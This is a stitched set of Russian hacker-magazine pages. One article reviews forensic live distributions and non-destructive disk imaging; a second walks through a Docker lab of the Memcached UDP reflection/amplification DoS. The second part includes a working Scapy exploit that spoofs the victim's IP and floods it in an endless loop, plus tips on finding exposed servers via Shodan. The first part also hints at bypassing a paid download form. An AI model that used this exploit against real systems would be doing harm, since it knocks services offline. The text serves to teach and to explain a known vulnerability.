 Чтобы этого не про исхо дило, работать с электронными вещ‐
 доками лучше всего, загрузившись с live CD. А еще лучше
 иметь загрузочный носитель со спе циализирован ным дис‐
 трибутивом. Об их выборе и особен ностях мы и поговорим
  в этой статье.


 ЦЕЛИ И МЕТОДЫ ФОРЕНЗИКИ
  Как ты уже мог узнать из предыду щей статьи в теме этого номера, методы
  форензики подразделяются на две боль шие группы: анализ включенной сис‐
  темы (например, работающего сервера) и выключенной (например, изъ ятых
  накопителей). Их еще называют динамическим и статичес ким анализом.
    Эти два метода в корне отличаются не только подходами, но и теми дан‐
  ными, которые удается собрать. В пер вом слу чае это наблюдение за ата‐
  кованной системой в реальном времени. Есть возможность непосредственно
  оценить дисковую и сетевую активность, получить список запущенных про‐
  цессов, открытых портов, просмотреть залогиненных пользователей, а глав‐
  ное — получить из оперативной памяти те данные, которые при отключении
  питания исчезнут бесследно. Например, ключи трояна‐шиф ровальщика, рас‐
  шифрованную копию смонтированных криптоконтейнеров и даже доступ
  к удаленным ресурсам, если на них в текущем сеансе была выпол нена авто‐
  ризация. После вык лючения компьютера вся эта информация окажется без‐
  возвратно  уте рянной, а криптографичес кие контейнеры останутся лишь
  зашифрованными файлами на диске.
    Наборы для анализа «вживую» каждый специалист формиру ет, исходя
  из собствен ных потребностей. Ска жем, админу достаточно уметь быс тро
  поднять сервисы, упавшие пос ле ата ки, и восста новить продуктив из бэкапа.
  Уже потом в спокой ной обста новке он, может быть, и глянет логи, но вряд ли
  найдет в них что‐то ценное. Айпиш ники китайских прокси? Признаки входа
  на корпоративный сайт через дырявую CMS, которую он хотел пропатчить
  месяц назад? Если все биз нес‐процес сы идут сво им чередом, дальнейшее
  расследование КИ для него теря ет смысл.
    Иные подходы у отдела расследова ния компьютерных инцидентов анти‐
  вирусной компании (который вместе с правоохранительными органами ана‐
  лизирует свежий случай массового заражения) или FinCERT, рас путывающей
  APT в какой‐нибудь пла тежной системе. Здесь совсем дру гие приоритеты:
  нужно собрать максимум информации, которую затем можно будет исполь‐
  зовать в суде. Обнаружить C&C‐серверы ботнета, найти источник угрозы,
  детально восстановить сценарий взлома и выйти на его организаторов (в
  идеале — с их последующим арес том). Для этого требуется тщательно соб‐
  рать доказательную базу, но проблема в том, что ана лиз системы почти всег‐
  да вносит в нее искажения. Задача специалис та по компьютерной кримина‐
  листике — свести их к минимуму и учесть при даль нейшем анализе.


            WARNING

                       Криминалистический анализ связан с доступом
                             к персональным данным и коммерческой тайне.
                       Для его проведения на чужой системе требуется
                        лицензия.



 КАК НЕ НАСЛЕДИТЬ СЛЕДОПЫТУ
  Первое правило форензики — не вно сить иска жений в оригинал. Для этого
  все действия выпол няют ся с точной (посекторной) копией исследуемой фай‐
  ловой системы и пол ными дампами оперативной памяти.
    К сожалению, на практике этот принцип час то нарушается из‐за незнания
  особенностей работы ОС, в том числе Live‐дистрибутивов. Для удобства
  во многих из них по умолчанию активиро вана функция автоматического под‐
  клю чения всех обнаруженных дисков. Особенно этим грешит Windows (вклю‐
  чая сборки на основе PE), которая создает на каждом диске временные фай‐
  лы и служебные каталоги (System Volume Information, $Recycle.Bin и так
  далее), но и в Linux проблем хватает.
    Во многих загрузочных дистрибутивах для форензики на основе Linux дис‐
  ковые разделы монтируются с опцией ‐o ro. Считается, что этого дос таточно
  для предотвращения случайной записи. Однако даже если для пользовате ля
  диск выглядит как подключенный в режиме «толь ко чтение», ядро ОС и драй‐
  веры файловой системы все равно могут изменять на нем служебные дан‐
  ные — например, время пос леднего обращения к файлу.
    По умолчанию среди параметров монтирования указан atime, что озна‐
  чает обновлять атрибут «время последнего доступа» при любом обращении
  к файлам. Для форен зики разумнее использовать noatime.
    Другую проблему представляют некорректно размонтированные разделы,
  что часто случается при изъятии дисков во время «маски‐шоу». Перед сле‐
  дующим монтированием поврежденная файловая система будет проверена
  и fsck попытается авто матичес ки устранить все найденные ошибки. Нап‐
  ример, программа исправит «подвисшие» индексные дес крипторы (которые
  описывают файлы, удаленные открытыми).
    Собственно говоря, драйверы всех журналируемых фай ловых сис тем
  (ext3/4, ReiserFS, XFS, NTFS и других) игнориру ют опцию ‐o ro при сис‐
  темных обращениях к диску. Что бы отучить их смотреть журнал и пытаться
  внести исправления, лучше монтировать исследуемые разделы с опцией ro,
  noload, ro,nolog или ro,norecovery — в зависи мости от типа фай ловой
  системы, однако и это не панацея.
    Непреднамеренная запись на исследуемый накопитель во время анализа
  все равно остается возможна, причем еще на этапе запус ка Live‐дистрибути‐
  ва. Например,  при  поиске  загрузочного  носителя,  записи  драйверов
  в initramfs и создании swap‐файла или автоматичес ком монтировании обна‐
  руженных дисковых разделов (в том числе для поиска Root FS банальным
  перебором всех подключенных дисков). Это одна из причин физичес ки под‐
  клю чать исследуемый накопитель уже после загрузки Live‐дистрибутива.
    Варианты решения проблемы самовольной записи на исследуемый диск
  зависят от особенностей дистрибутива и самого устройства. Например, тома
  ext3 и ext4 можно смонтировать как нежурналируемые (ext2).
    Долгое время для неразруша ющего ана лиза жестких дис ков считалось
  достаточным подключать их как блочное устрой ство в режиме «только чте‐
  ние»:


  blockdev ‐‐setro /dev/sdb2 (вместо sdb2 укажи актуальное обозначение
  диска)

  Казалось бы, все верно: blockdev использует системный вызов для изме‐
  нения флага ядра, который проверяется на уровне файловой системы. Если
  этот флаг установлен, то он отключает операции записи в ФС, причем
  не только пользовательские, но и системные (журналирование, восстанов‐
  ление, перезапись суперблока). Такой метод при меняется в большинстве
  дистрибутивов для форензики.
    Однако на практике некорректно написанный драйвер ФС все равно
  может пропустить эту проверку и выполнить операции записи.
    Поэтому использование blockdev в режиме «только чтение» гарантирован‐
  но работает только для приложений, запускаемых из userspace, обращения
  которых проверяет драйвер, но не для ядра ОС и самих драйверов.
    Самый надежный вариант — поместить между анализируемым диском
  и драйвером ФС виртуальное блочное устройство loop device. Оно не про‐
  пустит низкоуров невые команды и не даст сис теме тихо модифицировать
  исследуемый диск.


  mount ‐o ro,loop /dev/sdb2 dir (здесь dir — произвольное имя
  каталога)

  Аналогично метод работает с обра зами дисков.


  mount ‐o ro,loop diskimage.dd dir


 FLASH
  Отдельные сложности возника ют с твердотель ными накопителями. Их кон‐
  троллеры самостоятельно выполняют низкоуровневые операции для уско‐
  рения  последующей  записи  и  выравнивания  степени  износа  ячеек
  флеш‐памяти. Банальные операции Garbage Collection и TRIM могут выпол‐
  ниться в любой момент и похоронить надежду на вос становление удаленных
  файлов.
    Варианта решения этой проблемы как минимум два:
   1. Выпаять чипы памяти и считать их программа тором (бес полезно, если
    на SSD используется встроенное шифрование, а сейчас оно по умол‐
    чанию активировано на большинстве моделей).
   2. Создать  длинную  очередь  команд  на  чтение  (обычно  контроллер
    не выполняет внутренние операции, пока обра баты вает внешние зап‐
     росы).

  Это еще одна причина подклю чать анализируемый накопитель уже пос ле
  запуска ОС для криминалис тического ана лиза и сра зу снимать с него посек‐
  торный образ, не оставляя простаивающим ни секунды.
    Дополнительные искажения при работе с флеш‐накопителями возникают
  из‐за того, что те ячейки памяти, на которые ни разу не выполнялась запись,
  находятся в неопределенном сос тоянии. Попыт ка считать их воз вращает
  не нули, а случайные данные — шум микросхемы NAND Flash. Среди этого
  шума просто по закону больших чисел могут встретиться бай товые пос‐
  ледовательности, совпада ющие с известными заголовками фай лов. Поэтому
  программы восстановления данных при работе в посекторном режиме (глу‐
  бокий анализ) часто «находят» уда ленные фай лы там, где их никогда не было.


 КОПИЯ ИЛИ ПОДДЕЛКА?
  Качественный  сбор  информации  характеризу ется  воспроизводимостью
  (верифицируемостью) его результатов. Это возможно только при неразруша‐
 ющем и точном копировании данных. Однако даже сре ди специализирован‐
  ных «криминалистических» программ для создания образов встречаются
  ошибки.
    Например, в форензике час то использовалась (и кое‐где продол жает при‐
  меняться) консольная утилита dcﬂdd, раз работанная в Лаборатории судеб‐
  ной экспертизы компьютерной безопас ности (DCFL) — подразделении Цен‐
  тра защиты от киберпрес туплений (Лин тикам, штат Мэриленд). Это рас‐
  ширенный вариант программы dd, выполняющий побитную копию файловой
  системы. Если во время работы dcﬂdd произойдет ошибка чтения, то все пос‐
  ледующие номера секторов в обра зе окажутся смещены. Поддержка dcﬂdd
  была прекращена в 2006 году, и баг остался неис правленным.
    Созданная копия может оказать ся непол ной и в слу чае дампа памяти.
  Большинство утилит записывают только содержимое ОЗУ, игнорируя файл
  подкачки. Поэтому, кро ме стандартно го дампа, есть смысл делать копию
  pageﬁle.sys. Для этого удобно вос пользовать ся утилитой Forensic Toolkit Im‐
  ager. Это бесплатная часть платного набора Forensic ToolKit от Access Data,
 мощная программа для предварительного просмотра и визуализации дан‐
  ных, исполь зуемая при получении доказатель ств с работающих Windows‐
  машин.





                 Делаем дамп вмес те с pageﬁle.sys





                    Получа ем системные файлы

  Дополнительно FTK Imager поз воляет без перезаг рузки получить копии заб‐
  локированных файлов SAM и SECURITY, сделать копии веток реес тра SOFT‐
 WARE и SYSTEM. Программа умеет соз давать побитные копии данных (как
  отдельных файлов или папок, так и целых дисков) без внесения изме нений
  в оригинал. С ее помощью удобно прос матривать все физически имеющиеся
  файлы, вклю чая удален ные, но еще не перезаписанные.





                         Создаем обра зы

  Даже если на текущем эта пе ты не предполага ешь их исследование, все рав‐
  но лучше перестраховаться. Сохранение полной информации потребуется
  для более глубокого изучения инцидента в даль нейшем, когда его основные
  последствия уже будут устранены в работающей сис теме.


              INFO

                   Любой дистрибутив для форен зики потребует
                          некото рого   «напилинга».   Именно   поэтому
                          в  статье  разбираются  основные  проб лемы
                        и методы их решения. Общепринятого стандарта
                         здесь нет. В реальных судебных процессах кри‐
                       миналисты постоянно балан сируют между чис‐
                          тотой методики и скоростью сбо ра доказатель‐
                              ств.





                                       Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

             ТУЛКИТ
    ДЛЯ ФОРЕНЗИКИ
          ВЫБИРАЕМ ДИСТРИБУТИВ И НАБОР СОФТА
            ДЛЯ КРИМИНАЛИСТИЧЕСКОГО АНАЛИЗА





ПОПУЛЯРНЫЕ LIVE-ДИСТРИБУТИВЫ
Для компьютерной кримина лис тики были созданы десятки  Live CD/USB
с громкими названиями. Большинс тво из них ока зались однотипными кло‐
нами на базе Knoppix, Ubuntu и реже — других ОС. Здесь мы отметим только
современные и хорошо себя зареко мендовавшие. Начнем с бес платных.


CAINE
Итальянский дистрибутив CAINE (Computer Aided INvestigative Environment)
создан на базе Ubuntu 16.04. Он доступен в 32‐битной и 64‐разрядной вер‐
сии.  Последняя  сборка  называется  CAINE  9.0  Quantum  и  вышла
в октябре 2017 года. Авторы CAINE реализовали режим «только чте ние»
через blockdev и предлага ют удоб ный инстру мент управления разрешением
записи на диски. По умолчанию запись блокиру ется и ни один раздел (кроме
основного) не монтируется автоматичес ки. Однако CAINE не пре дотвращает
перезапись служебной информа ции на раз делах с журналируемыми ФС
и подключенными через менеджер логических томов LVM.





                    Бло кировка записи в CAINE

CAINE содержит десятки популярных ути лит для форензики, организованных
в соответствующие разделы. Они применя ются для изучения систем на базе
Windows и Linux. Типовые сценарии анализа частично автоматизированы.
Также в нем доступна полуавтоматичес кая компиляция окончательного отче‐
та, что помогает быстрее создавать стандартизированную доказательную
базу для суда.





                     Набор утилит в CAINE

CAINE вобрал в себя известные тулкиты (NirSoft, Sleuth Kit, Autopsy и другие),
поэтому с ним нет необ ходимос ти заг ружать их отдельно. Утилиты для Win‐
dows используются в режиме Live Forensic и ранее развивались в рамках дру‐
жественного проекта Win‐UFO. После его закрытия их добавили в сос тав
CAINE. Просто распакуй образ на флешку и запус ти их отдельно или через
лаунчер.





                      Утилиты для ана лиза Windows





            Детальный сбор данных о системе в WinAudit





                        NirSoft Launcher в составе CAINE


DEFT
Еще один итальянский дистрибутив на базе Ubuntu — DEFT (Digital Evidence &
Forensic Toolkit). Он связан с популярным тулкитом для пре парирования Win‐
dows‐машин на живую — DART (Digital Advanced Response Toolkit) и включает
в себя представленные в нем утилиты (запускаются через эмулятор WINE).
Работает эта связка не так ста бильно, как нативные приложения, да и в целом
DEFT уступает CAINE по функциональности.
  Основной акцент в DEFT сделан на создание точных дис ковых образов
и расширенную проверку целос тности данных с использованием разных
хеш‐функций.





                      Утилиты хеширования в DEFT





                    Создание образов в DEFT

Первая версия DEFT вышла в 2005 году. С 2012 года он развивается под эги‐
дой некоммерческой орга низации DEFT Association. Последняя (протес‐
тированная в этой статье) версия датируется январем 2017 года.


Parrot OS
Изначально итальянский (они там сго ворились, что ли?!) дистрибутив Parrot
OS не был ориентирован именно на форензику. Его прерогативой был ано‐
нимный веб‐серфинг и аудит безопасности. После того как пункт forensic
mode был добав лен в меню загрузки, Parrot OS успешно применяется и для
расследования КИ.





                             Parrot OS Forensic mode

Parrot OS базируется на Debian и активно развива ется. Пос ледняя версия
появилась все го пол тора месяца назад. Операционка очень легковесная
(может запускаться на системах с 256 Мбайт ОЗУ), работает на процес сорах
с архитектурой x86, x86‐64 и ARM, что поз воля ет эффективно использовать
ее также на Raspberry Pi и про чих одноплатниках.
  По функциональности это один из лучших дистрибутивов. В нем есть все
популярные инструменты для кримина листического анализа работающих
систем и образов плюс мощный пакет аудита чего угодно, как в Kali Linux.





           Набор инс трументов для форензики в Parrot OS

Интегрированный пакет Sleuth Kit и Autopsy (графический интерфейс к набору
Sleuth) упрощают оформление отчетов при рас следовании КИ. В них содер‐
жится вся собранная информа ция по раз делам вмес те с комментариями,
которые ИТ‐эксперт оставлял по ходу их обнаружения.


Sumuri PALADIN
Sumuri PALADIN — один из популярных продуктов Sumuri для форензики. Так‐
же базируется на Ubuntu и пыта ется заб локировать запись через blockdev (с
тем же частичным успехом, что и CAINE).





                         Запуск Paladin

В состав Paladin входит утилита для создания и конвертации образов дисков
разных форматов. Благодаря графичес кому интерфейсу с ней справится
и новичок.





                                 Paladin Toolbox

Разработчики распростра няют дистрибутив как donationware с рекомен‐
дованной ценой 25 дол ларов. Ты можешь указать и дру гую (как больше, так
и меньше), но в любом случае придется оформлять покупку. Подсказ ка: поля
не проверяются. Просто введи валидный почтовый индекс для выбранного
штата или страны.


Kali Linux — Forensic mode
При запуске в таком режиме Kali не монтиру ет автомати чески ни один раздел,
вклю чая swap. Все основные средства кри мина лис тического анализа соб‐
раны в метапаке kali‐forensics‐tools размером 3,1 Гбайт. Этот набор
из 84 утилит удобно использовать для са мос тоятельной сборки образа Kali,
в котором не будет ничего лишнего.





                                    Kali Forensic tools


ПЛАТНЫЕ ДИСТРИБУТИВЫ
SMARTLinux
По мнению многих поль зователей, он наиболее корректно блокирует запись
на  исследуемый  накопитель  в  дефолтных  нас тройках.  Рекомендуется
для выполнения верифицируемого нераз руша ющего анализа с целью пре‐
доставления надежных цифровых доказа тельств в суде.


EnCase Forensic
Де‐факто этот набор стал эталоном для Интерпола. Используется для ана‐
лиза дампа памяти компьютеров и мобильных устройств, включая смартфоны
и GPS‐трекеры. Подходит для совмес тной работы нескольких специалис тов.


Grml-Forensic
Очень известный дистрибутив на базе Debian, пос кольку используется
для обучения форен зике. При покупке лицензии предос тавляется дос туп
к закрытому сервису Grml‐Forensic Bug Tracking System.
   Grml‐Forensic умеет вза имо действовать с X‐Ways Forensics. Это рас ширен‐
ный вариант WinHex с кучей дополнительных функций. Он поддерживает
нетипичные для Windows файловые системы (HFS, XFS и другие). Умеет
читать и записывать файлы доказа тельств .e01 (образы EnCase). Может
выпол нять раздельный анализ файлов раз ных поль зователей. Име ет встро‐
енный анализатор дампов памяти и метаданных.


Helix
Представлен раздельными ветками для анализа вживую и офлайн. Для быс‐
трого дампа памяти, сбора паролей, списков активных процессов и открытых
портов есть Helix Live Response. Для офлай новой форензики предлагается
Helix3 Pro. Также есть бесплатная вер сия Helix3, но она не обновля лась
с 2009 года.


РАСКОПКИ
В мире специализированных дистрибутивов все быс тро меняется. Поэтому я
перечислю некогда популярные, но уста ревшие на сегодняшний день, просто
чтобы сэкономить твое время.


COFEE (Computer Online Forensic Evidence Extractor)
Набор утилит, который был популярен в National White Collar Crime Center
(NW3C), для сбо ра доказа тельств с компь юте ров под управлением Windows
XP и более младших версий. Разработан старшим следователем MS Internet
Safety Enforcement Team Энтони Фангом (Anthony Fung). В 2008–2009 годах
Microsoft  раздавала  его  на флешках  сот рудникам Интерпола и всем
ИТ‐экспертам, которые участвовали в задержании предполагаемых прес‐
тупников. COFEE ускорял сбор цифровых вещдоков, включая пароли, исто‐
рию браузера, содержимое папок пользователя и детальное описание сис‐
темы. Порой это избавляло от необходимости физически изымать компьюте‐
ры. Сейчас его убрали с сайта Microsoft, но он есть на торрентах.
  Сам дистрибутив не содержит ничего специфического за исключением
скрипта оформления процедуры сбо ра данных. Это просто набор извес тных
утилит (autoruns, netstat, ipconﬁg, pslist и прочие) в единой оболочке.


FIRE (Forensic and Incident Response Environment)
Прекратил существование в 2004 году. Это все, что нужно о нем знать.


INSERT (Inside Security Rescue Toolkit)
Последняя версия 1.3.9 выш ла в феврале 2007 года.


PlainSight
Первая и последняя версия 0.1 вышла в сентябре 2008 года. Подобных
попыток сде лать свой дистрибутив, ориентированный на задачи кри миналис‐
тики, было очень много.


ИЗ РЯДА ВОН
Все дистрибутивы для форензики довольно специфические, но есть и совсем
узкоспециализированные. Например, MacQuisition для криминалистичес кого
анализа macOS. Цены на индульгенцию Маквизиции начинаются от 1400 дол‐
ларов. В рассмотренных выше наборах его отчасти заменяет бесплатная
линуксовая утилита volafox для исследова ния дампа памяти «маков». Она
используется (в том числе) для поиска загруженных в ОЗУ ключей.
  Проект WinFE (Windows Forensic Environment) — смелая попытка занимать‐
ся офлайновым анализом КИ из вин ды. Впрочем, ее забросили в 2012 году.
Сейчас для Live Forensic виндовых машин удобнее использовать наборы
от NirSoft и Sysinternals, а офлайновый анализ и вовсе выполнять в сре де Lin‐
ux.


        WWW

                     •Цикл кратких уроков «Форензика с Kali»
                     •Введение в Linux‐форен зику для начинающих
                     •Руководство FTK Imager
ВЗЛОМ
 MEMCACHED
 КАК СРЕДСТВО
      DOS   ДЛЯ





              КАК ОШИБКА В КОНФИГЕ
             ПРЕВРАТИЛА
            ПОЛЕЗНУЮ УТИЛИТУ

               aLLy            В ХАКЕРСКОЕ ОРУЖИЕ              ONsec
             @iamsecurity





В конце февраля этого года GitHub подвергся мощнейшей
DoS‐атаке с пиковой мощностью 1 Тбайт/с. Атака стала воз‐
можна из‐за особенностей кеширующей базы данных Mem‐
cached. Помимо GitHub, ее используют Facebook, LiveJournal
и другие боль шие сайты. В этой статье я расскажу, что дела‐
ет небольшой скрипт на Python, который привел к таким пос‐
ледствиям.


Сама атака относится к типу так называемых DRDoS (Distributed Reﬂection De‐
nial of Service) — отраженных DoS, ког да сервер ата куется не напрямую зап‐
росами от ботов, а ответными пакетами. В случае с Memcached злоумыш‐
ленник отправляет запрос якобы с IP‐адреса жертвы, БД верит этому и ответ
уходит уже на реальный сервер.
  Важно, что здесь присутс тву ет так называемое умножение (амплифика‐
ция) мощности, когда раз мер ата кующего трафика увеличивается в нес коль‐
ко раз. Таким образом, запрос в 15 байт, отправленный «Мемкешу», прев‐
ращается в ответ размером в нес колько сотен килобайт, что дает колоссаль‐
ный фактор умножения — пример но в 51 тысячу раз.
  Давай разберемся, как это можно провернуть, кто виноват и как такое
предотвращать.


ГОТОВИМСЯ
Для демонстрации атаки нам понадобится целых четыре стенда. Для этих
целей я буду использовать контейнеры Docker. Первый контейнер будет
играть роль сервера‐жертвы, два других — боты для проведения DoS, и,
наконец, последний ста нет изображать компь ютер атакующе го, откуда мы
запустим эксплоит.
  Все эти контейнеры будут работать на Debian и, за исключением установ‐
ленных пакетов, могут быть идентичными.
  Запускаем сервер‐жертву.


docker run ‐ti ‐‐rm ‐‐privileged ‐‐name=memcvictim ‐‐hostname=memcvi
ctim debian

Первое, что сделаем после старта контейнера, — установим все необ‐
ходимые приложения и зависимос ти. Помимо непос редс твенно Memcached,
нужно будет установить какой‐нибудь сниффер, чтобы наглядно пронаб‐
людать атаку.


apt‐get update && apt‐get install ‐y tcpdump build‐essential wget
libevent‐dev

Сам дистрибутив Memcached будем собирать из исходников, нам понадобит‐
ся версия 1.5.5.


cd ~/ && wget http://www.memcached.org/files/memcached‐1.5.5.tar.gz &
& tar xzf memcached‐1.5.5.tar.gz
cd ~/memcached‐1.5.5 && ./configure && make && make install
memcached ‐u root





  Запущенный докер‐контейнер, который будет играть роль сервера
  для атаки

Теперь дело за DoS‐ботами, на них просто поднима ем ту же самую версию
Memcached и линкуем контейнеры с жер твой, что бы они могли отправлять ей
пакеты по сети.


docker run ‐ti ‐‐rm ‐‐privileged ‐‐link=memcvictim ‐‐name=memcdo
sbot1 ‐‐hostname=memcdosbot1 debian
docker run ‐ti ‐‐rm ‐‐privileged ‐‐link=memcvictim ‐‐name=memcdo
sbot2 ‐‐hostname=memcdosbot2 debian

Компилируем дистрибутив.


cd ~/ && wget http://www.memcached.org/files/memcached‐1.5.5.tar.gz &
& tar xzf memcached‐1.5.5.tar.gz
cd ~/memcached‐1.5.5 && ./configure && make && make install
memcached ‐u root

И последняя в списке — машина атакующего. Ее нужно слинковать с DoS‐
ботами.


docker run ‐ti ‐‐rm ‐‐privileged ‐‐link=memcdosbot1 ‐‐link=memcdo
sbot2 ‐‐name=attacker ‐‐hostname=attacker debian

Здесь нам понадобится Python и библиотеки: Scapy для манипулирования
пакетами на низком уровне и memcache — для работы с базой данных.


apt‐get update && apt‐get install ‐y nano python wget
python‐requests python‐scapy python‐memcache tcpdump

Скачиваем исходный код экс пло ита.


cd ~ && wget https://www.exploit‐db.com/download/44254.py

В итоге у нас получилась следующая схема.





        Схема тестового окру жения для проверки Memcached DoS


ПАРА СЛОВ ПРО UDP
Атака будет выпол няться по протоколу UDP, поэтому не мешало бы немного
поговорить о его структуре. User Datagram Protocol, или протокол поль‐
зовательских датаграмм, — один из ключевых элементов стека TCP/IP. UDP,
в отличие от TCP, исполь зует упрощенную переда чу пакетов. В контексте про‐
токола они называются датаграмма ми и не содержат всевоз можных штампов
времени, подписей, проверки целостности данных и тому подобных вещей.
  Подразумевается, что UDP должен использовать ся только для передачи
не сильно критичных дан ных, так как допус кает, что они могут дублироваться,
потеряться или приходить не в уста новленном порядке. Если нужны какие‐то
проверки состояний, то вся логика ложится на плечи конечного приложения.
   Все, что касается вида датаграммы, описывается в стандарте RFC 768,
который был представлен в августе 1980 года. Согласно этому документу
структура пакета UDP выглядит следующим обра зом.





                         Структура UDP‐пакета

Заголовок датаграммы сос тоит из четырех полей, каждое имеет размер два
байта (16 бит). Выделенные цветом поля необязательны к использованию
в протоколе IPv4.
  Поле порт отправителя, как следует из названия, отвечает за номер порта
отправителя. Если предполагается, что на переданные пакеты нужно отве‐
чать, то значение это го поля определяет, на какой конечный порт будет
посылаться ответ. Это первое важ ное для эксплу ата ции поле.
   Порт получателя нужен, что бы датаграмма ушла на порт, который слушает
обрабатывающий ее сер вис.
  Поскольку UDP — это про токол без уста новления соединения, то, чтобы
передавать данные между машина ми в сети, он работает над IPv4. Так что,
помимо этих заголовков, присутствуют, разумеется, еще и заголовки от IP.





             Обычный пакет UDP в сниффере Wireshark

Как видишь, теперь появились еще заголовки Source и Destination, в которых
указаны IP‐адреса машин клиента и сервера соот ветс твенно.


ОСОБЕННОСТИ УЯЗВИМОСТИ
Схема этой атаки стара, как стек TCP/IP, потому что в ее основе лежит под‐
мена IP‐адреса отправителя (IP Spooﬁng). При составлении пакета можно
указать произвольный IP в заголовке Source. Некорректно настроенный сер‐
вер или приложение без соответствующих проверок отправит ответ на ука‐
занный в этом поле адрес. Таким образом можно зас тавлять ничего
не подозревающие машины засыпать пакета ми неугодные злоумышленни кам
серверы.
  Memcached  по  умол чанию  вешает  кеширующий  сервис  на  TCP‐
порт 11211 на локальном адресе. Однако этим он не ограничивается и в
довесок открывает UDP‐порт под тем же номером, только уже на всех воз‐
можных интерфейсах. Такое поведение — это отголоски давно минувших
дней, когда машины были нас только слабыми, что оверхед, который приносит
реализация протоко ла TCP, ощутимо влиял на производительность при ложе‐
ния.
   Взглянем на коммит, который исправляет этот мисконфиг (уяз вимостью
такое упущение можно назвать лишь с натяжкой).





                   Патч, который фиксит DoS‐мисконфиг

Действительно, до этого пат ча по умолчанию UDP‐порт 11211 торчал наружу.


memcached.c
7482:     if (tcp_specified && settings.port != 0 && !udp_specified)
{
7483:         settings.udpport = settings.port;
7484:     } else if (udp_specified && settings.udpport != 0 && !
tcp_specified) {
7485:         settings.port = settings.udpport;
7486:     }

Проверить мисконфиг можно простой командой:


echo ‐en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc ‐q1 ‐u 127.
0.0.1 11211





            Тестирование сервера Memcached на уяз вимость

Давай вооружим ся биб лиотекой Scapy и попробу ем вручную собрать пакет,
который уйдет на нужный нам адрес. Отправлять будем с машины атакующе‐
го. За заголовки Source и Destination отвечают параметры src и dst. В пер‐
вое поле впишем адрес машины, куда мы хотим отправить ответ, сфор‐
мированный сервером Memcached, который ука зан во втором поле. Пакет мы
будем отправ лять на машину memcvictim с IP‐адресом 172.17.0.2.


root@attacker:/# scapy
Welcome to Scapy (unknown.version)
>>> pck_ip = IP(src="172.17.0.2", dst="memcdosbot1")

Дальше дело за самой датаграммой. В sport пишем порт, на который будет
отправлен ответ, в dport — порт, на который уйдет наш пакет. Это дефол тный
порт Memcached 11211.


>>> pck_udp = UDP(sport=31337, dport=11211)

В качестве команды для теста будем отправлять stats sizes, которая выводит
статистику о размерах элемен тов в кеше.


>>> pck_data = "\x00\x00\x00\x00\x00\x01\x00\x00stats sizes\r\n"

Прежде чем отправлять пакет, запустим сниффер tcpdump на машине mem‐
cvictim, чтобы проконтролировать дос тавку пакета.


root@memcvictim:~/memcached‐1.5.5# tcpdump ‐X port 31337

Время отправ лять пакет, для это го существует функция send().


>>> ans = send(pck_ip/pck_udp/pck_data)





        Спуфинг IP‐адреса и отправка ответа на компьютер‐жертву

Благодаря этому ответ от Memcached уходит на адрес компьютера‐жертвы.
Причем он немного боль ше по раз меру, чем данные, которые мы отправили.
Если использовать просто команду stats, то ответ будет еще больше.





          Пе рехваченный ответ на Memcached‐команду stats

Изначальный размер пакета‐запроса был 43 байт, а ответ в итоге получил ся
1400 + 508 = 1908 байт, что примерно в 44 раза больше. Теперь мы
можем использовать и другие команды Memcached для уве личе ния размеров
ответа. Например, можно создать свои ключи и записать в качестве значений
данные нужного размера, а затем, используя команду get  <имя_ключа>,
отправить их на атакуемую машину. При чем можно получать данные сразу
нескольких ключей, указывая их названия через пробел: get <имя_ключа_1>
<имя_ключа_2> <имя_ключа_3>.
  В эксплоите в качестве зна чений клю ча используется ответ от google.com.


44254.py
38: payload = requests.get("https://google.com").text
...
78:             mc = memcache.Client([server],debug=False)
79:             mc.set(payload_key, payload)

Возьмем это на заметку и соберем свой мини‐эксплоит. Сначала импорти‐
руем необходимые модули.


import requests
import memcache
import re
from scapy.all import *
payload = requests.get("https://google.com").text

Список keys будет содержать имена создаваемых ключей.


keys = [
    "key1",
    "key2",
    "key3"
]

А packets — подготов ленные к отправке пакеты.


packets = []

В переменной SERVER_LIST будем хра нить адреса уязвимых серверов Mem‐
cached. У нас их всего два — memcdosbot1 и memcdosbot2.


SERVER_LIST = [
    "memcdosbot1:11211",
    "memcdosbot2:11211",
]

В SERVER_TO_ATTACK находится IP‐адрес и порт атакуемой машины.


SERVER_TO_ATTACK = "172.17.0.2:11211"
target_ip, target_port = SERVER_TO_ATTACK.split(":")

Теперь работаем с каждым сервером по отдельнос ти. Сначала создадим
пары ключ — значение.


for server in SERVER_LIST:
    if ':' in server:
        server, port = server.split(':')
    cmd = "get"
    for key in keys:
        mc = memcache.Client([server],debug=False)
        mc.set(key, payload)
        cmd += " {}".format(key)

Дальше дело за формированием пакета и его записью в список пакетов,
готовых к отправке.


    pck_ip = IP(src=target_ip, dst=server)
    pck_udp = UDP(sport=int(target_port), dport=int(port))
    pck_data = "\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n".format(cmd)
    packets.append(pck_ip/pck_udp/pck_data)

Отправляем пакеты.


while True:
    for packet in packets:
        send(packet)

После чего на атакуемой машине видим при мерно такую пакетную вак‐
ханалию.





      Успешная эксплуата ция. Завали ваем пакета ми машину‐жертву

Здесь я написал просто while True, но при желании можно было бы исполь‐
зовать библиоте ку asyncio для асин хронной отправки пакетов. К тому же сама
Scapy умеет отправлять данные в бесконечном потоке, если в аргу менты
вызова send добавить loop=1. Но это уже не относится к раз бору уязвимости,
можешь сам побало ваться на досуге.


РЕАЛЬНЫЕ ОПАСНОСТИ
У нас были две подконтрольные нам машины с уязвимыми серверами Mem‐
cached, но в реальных кейсах для проведения ата ки злоумышленнику пот‐
ребуется раздобыть достаточное количес тво таких серверов. Где их взять?
Пятисекундное шуршание в популярных поисковиках типа Shodan и ZoomEye
выдает десятки тысяч потенциально годных для таких целей компьютеров.





     Список найденных на сервисе ZoomEye серверов с Memcached





      Список найденных на сервисе Shodan серверов с Memcached

Дальше  работает  простая  матема тика.  Если  взять  три  ключа  где‐то
по 11 Кбайт каждый и отпра вить их с десяти тысяч серверов, то получается
мощность чуть больше 2,64 Гбайт/с. При этом исходящая мощность изна‐
чально была все го чуть более 10 Мбайт. Разумеется, это все бумажные числа
и на практике все может силь но менять ся, так как зависит от множества фак‐
торов. Но масштабы возможных проблем прикинуть поз воляет.
  Независимый эксперт Амир Хашаяр Мохаммади (Amir Khashayar Moham‐
madi) выложил на GitHub сорцы написанной на Python утилиты со звонким
названием Memcrashed, которая в автомати чес ком режиме парсит данные
с Shodan о доступных серверах с Memcached. Затем начинает атаковать ука‐
занный при запуске IP‐адрес, рассылая команды на эти серверы.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





